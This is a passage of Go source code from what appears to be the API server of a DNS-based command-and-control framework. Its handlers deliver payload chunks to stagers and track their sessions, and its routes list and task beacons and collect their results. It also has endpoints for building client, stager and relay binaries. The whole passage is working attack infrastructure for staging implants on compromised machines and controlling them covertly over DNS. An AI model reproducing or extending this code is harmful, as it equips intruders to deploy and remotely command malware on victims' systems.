			ChunkIndex: req.ChunkIndex,
			Success:    false,
			Message:    "chunk not found",
		})
		return
	}

	// Mark chunk as delivered
	if err := api.db.MarkStagerChunkDelivered(req.SessionID, req.ChunkIndex); err != nil {
		if api.config.Debug {
			fmt.Printf("[API] Warning: Failed to mark chunk as delivered: %v\n", err)
		}
	}

	// Update session activity
	api.db.UpdateStagerSessionActivity(req.SessionID)

	// Log chunk delivery (always, not just debug)
	fmt.Printf("[API] Chunk %d delivered to stager %s via DNS server %s\n",
		req.ChunkIndex, req.StagerIP, dnsServerID)

	if api.config.Debug {
		fmt.Printf("[API] Debug: Session %s, assigned to %s\n", req.SessionID, assignedDNS)
	}

	// Return chunk data
	response := StagerChunkResponse{
		ChunkIndex: req.ChunkIndex,
		ChunkData:  chunkData,
		Success:    true,
	}

	api.sendJSON(w, response)
}

// StagerContactRequest represents a stager making first contact with DNS server
type StagerContactRequest struct {
	DNSServerID    string `json:"dns_server_id"`
	ApiKey         string `json:"api_key"`
	ClientBinaryID string `json:"client_binary_id"`
	StagerIP       string `json:"stager_ip"`
	OS             string `json:"os"`
	Arch           string `json:"arch"`
}

// StagerProgressRequest represents a progress report from DNS server
type StagerProgressRequest struct {
	DNSServerID string `json:"dns_server_id"`
	SessionID   string `json:"session_id"`
	ChunkIndex  int    `json:"chunk_index"`
	StagerIP    string `json:"stager_ip"`
}

// generateDeterministicStagerSessionID creates a consistent session ID based on stager IP + binary ID
// This ensures all DNS servers generate the same session ID for the same stager deployment
// Critical for Shadow Mesh: stager load-balances across multiple DNS servers
// sha256Hash returns hex-encoded SHA256 hash of input string
func sha256Hash(data string) string {
	hash := sha256.Sum256([]byte(data))
	return hex.EncodeToString(hash[:])
}

func generateDeterministicStagerSessionID(stagerIP, clientBinaryID string) string {
	// Hash stager IP + client binary ID to get deterministic session ID
	data := fmt.Sprintf("%s|%s", stagerIP, clientBinaryID)
	hash := sha256.Sum256([]byte(data))

	// Use first 4 hex chars from hash (16 bits) - matches stg_XXXX format
	hashHex := hex.EncodeToString(hash[:])
	return fmt.Sprintf("stg_%s", hashHex[:4])
}

// handleStagerContact records when a stager makes first contact with a DNS server (from cache)
// This does NOT create a new session - the session was already created when Master built the stager
func (api *APIServer) handleStagerContact(w http.ResponseWriter, r *http.Request) {
	var req StagerContactRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")
	if dnsServerID == "" {
		dnsServerID = req.DNSServerID
	}

	// Create a stager session when contact is made from cache
	// Generate DETERMINISTIC session ID based on stager IP + binary ID
	// This ensures all DNS servers use the same session ID for the same stager
	sessionID := generateDeterministicStagerSessionID(req.StagerIP, req.ClientBinaryID)

	// Get total chunks from the cached binary
	chunkCount, err := api.db.GetCachedChunkCount(req.ClientBinaryID)
	if err != nil {
		// If we can't get chunk count, log warning but continue
		fmt.Printf("[API] Warning: Could not get chunk count for cached binary %s: %v\n", req.ClientBinaryID, err)
		chunkCount = 0 // Will be updated as chunks are served
	}

	// Create stager session in database for UI tracking
	err = api.db.CreateStagerSession(
		sessionID,
		req.StagerIP,
		req.OS,
		req.Arch,
		req.ClientBinaryID,
		dnsServerID,
		chunkCount,
	)

	if err != nil {
		// Log error but don't fail - DNS server already serving from cache
		fmt.Printf("[API] Warning: Failed to create stager session for tracking: %v\n", err)
	} else {
		fmt.Printf("[API] Stager session created from cache contact: %s | Stager: %s (%s/%s) | Binary: %s | Chunks: %d\n",
			sessionID, req.StagerIP, req.OS, req.Arch, req.ClientBinaryID, chunkCount)
	}

	// Log the contact
	fmt.Printf("[API] Stager contact: %s (%s/%s) contacted DNS server %s using cached binary %s\n",
		req.StagerIP, req.OS, req.Arch, dnsServerID, req.ClientBinaryID)

	// Return success with session ID for DNS server to use in progress reports
	api.sendSuccess(w, "contact recorded", map[string]interface{}{
		"session_id": sessionID,
	})
}

// handleStagerProgress processes stager chunk delivery progress reports from DNS servers
func (api *APIServer) handleStagerProgress(w http.ResponseWriter, r *http.Request) {
	var req StagerProgressRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	dnsServerID := r.Header.Get("X-DNS-Server-ID")
	if dnsServerID == "" {
		dnsServerID = req.DNSServerID
	}

	// Mark chunk as delivered in database
	if err := api.db.MarkStagerChunkDelivered(req.SessionID, req.ChunkIndex); err != nil {
		if api.config.Debug {
			fmt.Printf("[API] Warning: Failed to mark chunk %d as delivered: %v\n", req.ChunkIndex, err)
		}
	}

	// Update session activity
	api.db.UpdateStagerSessionActivity(req.SessionID)

	// Log progress (periodic batching could reduce logs)
	if req.ChunkIndex%100 == 0 || api.config.Debug {
		fmt.Printf("[API] Progress: Chunk %d delivered for session %s via DNS %s\n",
			req.ChunkIndex, req.SessionID, dnsServerID)
	}

	api.sendSuccess(w, "progress recorded", nil)
}

// panicRecoveryMiddleware catches panics and prevents server crashes
func (api *APIServer) panicRecoveryMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if err := recover(); err != nil {
				fmt.Printf("[API] PANIC RECOVERED: %v\nPath: %s %s\n", err, r.Method, r.URL.Path)
				// Try to send error response (might fail if headers already sent)
				w.WriteHeader(http.StatusInternalServerError)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"success": false,
					"message": "internal server error",
				})
			}
		}()
		next.ServeHTTP(w, r)
	})
}

// SetupRoutes configures all API routes
func (api *APIServer) SetupRoutes(router *mux.Router) {
	// Add panic recovery middleware to all routes
	router.Use(api.panicRecoveryMiddleware)

	// Web UI endpoints (serve HTML)
	router.HandleFunc("/", api.handleRoot).Methods("GET")
	router.HandleFunc("/login", api.handleLoginPage).Methods("GET")
	router.HandleFunc("/dashboard", api.handleDashboardPage).Methods("GET")
	router.HandleFunc("/beacon", api.handleBeaconPage).Methods("GET")
	router.HandleFunc("/dns-servers", api.handleDNSServersPage).Methods("GET")
	router.HandleFunc("/builder", api.handleBuilderPage).Methods("GET")
	router.HandleFunc("/stager", api.handleStagerPage).Methods("GET")
	router.HandleFunc("/users", api.handleUsersPage).Methods("GET")

	// Serve static files (CSS, JS, images)
	router.PathPrefix("/web/static/").Handler(
		http.StripPrefix("/web/static/", http.FileServer(http.Dir(filepath.Join(api.config.WebRoot, "static")))),
	)

	// Public API endpoints (no auth required) - with strict rate limiting
	authRouter := router.PathPrefix("/api/auth").Subrouter()
	authRouter.Use(api.rateLimitMiddleware(api.authLimiter))
	authRouter.HandleFunc("/login", api.handleLogin).Methods("POST")

	// Operator endpoints (JWT auth required) - with standard rate limiting
	operatorRouter := router.PathPrefix("/api").Subrouter()
	operatorRouter.Use(api.rateLimitMiddleware(api.apiLimiter))
	operatorRouter.Use(api.authMiddleware)
	operatorRouter.Use(api.csrfMiddleware) // CSRF protection for web UI

	operatorRouter.HandleFunc("/auth/logout", api.handleLogout).Methods("POST")
	operatorRouter.HandleFunc("/auth/me", api.handleCurrentUser).Methods("GET")

	// User management endpoints
	operatorRouter.HandleFunc("/operators", api.handleListOperators).Methods("GET")
	operatorRouter.HandleFunc("/operators/{id}", api.handleGetOperator).Methods("GET")
	operatorRouter.HandleFunc("/operators", api.handleCreateOperator).Methods("POST")
	operatorRouter.HandleFunc("/operators/{id}", api.handleUpdateOperator).Methods("PUT")
	operatorRouter.HandleFunc("/operators/{id}/password", api.handleChangePassword).Methods("POST")
	operatorRouter.HandleFunc("/operators/{id}", api.handleDeleteOperator).Methods("DELETE")
	operatorRouter.HandleFunc("/operators/{id}/status", api.handleToggleOperatorStatus).Methods("POST")

	operatorRouter.HandleFunc("/dns-servers", api.handleListDNSServers).Methods("GET")
	operatorRouter.HandleFunc("/beacons", api.handleListBeacons).Methods("GET")
	operatorRouter.HandleFunc("/beacons/{id}", api.handleGetBeacon).Methods("GET")
	operatorRouter.HandleFunc("/beacons/{id}/dns-contacts", api.handleGetBeaconDNSContacts).Methods("GET")
	operatorRouter.HandleFunc("/beacons/{id}", api.handleDeleteBeacon).Methods("DELETE")
	operatorRouter.HandleFunc("/beacons/{id}/task", api.handleCreateTask).Methods("POST")
	operatorRouter.HandleFunc("/tasks", api.handleListTasks).Methods("GET")
	operatorRouter.HandleFunc("/tasks/{id}", api.handleGetTask).Methods("GET")
	operatorRouter.HandleFunc("/tasks/{id}", api.handleDeleteTask).Methods("DELETE")
	operatorRouter.HandleFunc("/tasks/{id}/result", api.handleGetTaskResult).Methods("GET")
	operatorRouter.HandleFunc("/tasks/{id}/progress", api.handleGetTaskProgress).Methods("GET")
	operatorRouter.HandleFunc("/tasks/{id}/status", api.handleGetTaskStatus).Methods("GET")
	operatorRouter.HandleFunc("/stats", api.handleStats).Methods("GET")

	// Builder endpoints
	operatorRouter.HandleFunc("/builder/dns-server", api.handleBuildDNSServer).Methods("POST")
	operatorRouter.HandleFunc("/builder/client", api.handleBuildClient).Methods("POST")
	operatorRouter.HandleFunc("/builder/client-binaries", api.handleListClientBinaries).Methods("GET")
	operatorRouter.HandleFunc("/builder/stager", api.handleBuildStager).Methods("POST")
	operatorRouter.HandleFunc("/builder/builds", api.handleListBuilds).Methods("GET")
	operatorRouter.HandleFunc("/builder/builds/download", api.handleDownloadBuild).Methods("GET")
	operatorRouter.HandleFunc("/builder/builds/delete", api.handleDeleteBuild).Methods("DELETE")

	// Stager session endpoints
	operatorRouter.HandleFunc("/stager/sessions", api.handleListStagerSessions).Methods("GET")
	operatorRouter.HandleFunc("/stager/sessions/{id}", api.handleGetStagerSession).Methods("GET")

	// DNS server endpoints (API key auth required) - with high rate limits
	dnsRouter := router.PathPrefix("/api/dns-server").Subrouter()
	dnsRouter.Use(api.rateLimitMiddleware(api.dnsLimiter))
	dnsRouter.Use(api.dnsServerAuthMiddleware)

	dnsRouter.HandleFunc("/register", api.handleDNSServerRegistration).Methods("POST")
	dnsRouter.HandleFunc("/checkin", api.handleDNSServerCheckin).Methods("POST")
	dnsRouter.HandleFunc("/beacon", api.handleBeaconReport).Methods("POST")
	dnsRouter.HandleFunc("/result", api.handleSubmitResult).Methods("POST")
	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
	dnsRouter.HandleFunc("/tasks/delivered", api.handleMarkTaskDelivered).Methods("POST")
	dnsRouter.HandleFunc("/task-statuses", api.handleGetTaskStatusesForDNSServer).Methods("GET")
	dnsRouter.HandleFunc("/beacons", api.handleGetBeaconsForDNSServer).Methods("GET")

	// Stager protocol endpoints (called by DNS servers on behalf of stagers)
	dnsRouter.HandleFunc("/stager/init", api.handleStagerInit).Methods("POST")
	dnsRouter.HandleFunc("/stager/chunk", api.handleStagerChunk).Methods("POST")
	dnsRouter.HandleFunc("/stager/contact", api.handleStagerContact).Methods("POST")
	dnsRouter.HandleFunc("/stager/progress", api.handleStagerProgress).Methods("POST")

	// Health check endpoint (no auth)
	router.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	}).Methods("GET")
}

// Web UI Handlers

func (api *APIServer) handleRoot(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "/login", http.StatusSeeOther)
}

func (api *APIServer) handleLoginPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "login.html"))
}

func (api *APIServer) handleDashboardPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "dashboard.html"))
}

func (api *APIServer) handleBeaconPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "beacon.html"))
}

func (api *APIServer) handleDNSServersPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "dns-servers.html"))
}

func (api *APIServer) handleUsersPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "users.html"))
}

func (api *APIServer) handleStagerPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "stager.html"))
}
